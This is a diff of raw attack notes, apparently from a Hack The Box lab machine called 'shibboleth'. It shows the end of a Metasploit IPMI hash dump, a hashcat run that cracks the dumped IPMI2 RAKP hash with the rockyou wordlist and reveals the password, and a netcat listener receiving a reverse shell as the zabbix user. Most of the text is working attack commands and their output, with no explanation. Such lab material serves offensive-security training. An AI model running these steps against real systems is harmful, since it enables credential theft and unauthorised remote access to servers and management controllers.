@@ -151,3 +151,90 @@ msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run
 [*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
 msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) 
+
+
+
+
+
+hashcat -m 7300 hash /usr/share/wordlists/rockyou.txt
+hashcat (v6.1.1) starting...
+
+* Device #1: WARNING! Kernel exec timeout is not disabled.
+             This may cause "CL_OUT_OF_RESOURCES" or related errors.
+             To disable the timeout, see: https://hashcat.net/q/timeoutpatch
+* Device #2: WARNING! Kernel exec timeout is not disabled.
+             This may cause "CL_OUT_OF_RESOURCES" or related errors.
+             To disable the timeout, see: https://hashcat.net/q/timeoutpatch
+nvmlDeviceGetFanSpeed(): Not Supported
+
+CUDA API (CUDA 11.4)
+====================
+* Device #1: NVIDIA GeForce GTX 1650, 3856/3911 MB, 14MCU
+
+OpenCL API (OpenCL 3.0 CUDA 11.4.158) - Platform #1 [NVIDIA Corporation]
+========================================================================
+* Device #2: NVIDIA GeForce GTX 1650, skipped
+
+OpenCL API (OpenCL 2.0 pocl 1.8  Linux, None+Asserts, RELOC, LLVM 9.0.1, SLEEF, DISTRO, POCL_DEBUG) - Platform #2 [The pocl project]
+====================================================================================================================================
+* Device #3: pthread-AMD Ryzen 7 4800H with Radeon Graphics, skipped
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Applicable optimizers applied:
+* Zero-Byte
+* Not-Iterated
+* Single-Hash
+* Single-Salt
+
+ATTENTION! Pure (unoptimized) backend kernels selected.
+Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.
+If you want to switch to optimized backend kernels, append -O to your commandline.
+See the above message to find out about the exact limits.
+
+Watchdog: Temperature abort trigger set to 90c
+
+Host memory required for this attack: 309 MB
+
+Dictionary cache built:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344392
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+* Runtime...: 0 secs
+
+5fc848fa820100002eeb192a99e29bd979c53735eadc040ebd88ff2ec56657f8fb461961e0bd8a1ea123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:828b49d276eb4edfc57cbebdd63a8e89c9765a41:ilovepumkinpie1
+                                                 
+Session..........: hashcat
+Status...........: Cracked
+Hash.Name........: IPMI2 RAKP HMAC-SHA1
+Hash.Target......: 5fc848fa820100002eeb192a99e29bd979c53735eadc040ebd8...765a41
+Time.Started.....: Sun Dec  5 10:58:52 2021 (1 sec)
+Time.Estimated...: Sun Dec  5 10:58:53 2021 (0 secs)
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:  5500.2 kH/s (8.98ms) @ Accel:1024 Loops:1 Thr:64 Vec:1
+Recovered........: 1/1 (100.00%) Digests
+Progress.........: 8257536/14344385 (57.57%)
+Rejected.........: 0/8257536 (0.00%)
+Restore.Point....: 7340032/14344385 (51.17%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidates.#1....: ina-123456 -> estampillas
+Hardware.Mon.#1..: Temp: 53c Util: 36% Core:1785MHz Mem:5000MHz Bus:8
+
+Started: Sun Dec  5 10:58:33 2021
+Stopped: Sun Dec  5 10:58:54 2021
+
+
+
+nc -lnvp 9001
+listening on [any] 9001 ...
+connect to [10.10.14.10] from (UNKNOWN) [10.129.228.134] 50404
+bash: cannot set terminal process group (1201): Inappropriate ioctl for device
+bash: no job control in this shell
+zabbix@shibboleth:/$ ls
